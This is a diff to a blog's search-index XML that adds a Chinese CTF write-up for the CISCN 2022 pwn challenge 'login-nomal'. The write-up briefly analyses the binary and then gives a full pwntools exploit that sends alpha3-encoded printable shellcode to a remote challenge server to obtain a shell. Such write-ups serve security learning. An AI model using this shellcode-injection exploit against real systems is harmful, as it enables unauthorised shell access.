@@ -1024,6 +1024,27 @@
       </tags>
   </entry>
   <entry>
+    <title>CISCN2022_pwn_wp</title>
+    <url>/2022/07/03/CISCN2022-pwn-wp/</url>
+    <content><![CDATA[<p>pwn签到</p>
+<span id="more"></span>
+
+<h2 id="login-nomal"><a href="#login-nomal" class="headerlink" title="login-nomal"></a>login-nomal</h2><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序的流程是登录执行shellcode，shellcode需要通过检测，使用alpha3生成一个可见字符串shellcode。</p>
+<p>生成的shellcode的内容为：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">asm(shellcraft.sh())+asm(<span class="string">&#x27;;jmp rsp&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然后利用alpha3来将其转为可见字符形式。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./login&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;59.110.105.63&#x27;</span>,<span class="number">23231</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.33.so&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">payload =<span class="string">&#x27;msg: ro0t \n&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;opt: 1\n&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;msg: &#x27;</span>+shellcode+<span class="string">&#x27; \n&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;opt: 2\n&#x27;</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+        <tag>CTF</tag>
+        <tag>writeup</tag>
+        <tag>CISCN</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>categories</title>
     <url>/categories/index.html</url>
     <content><![CDATA[]]></content>
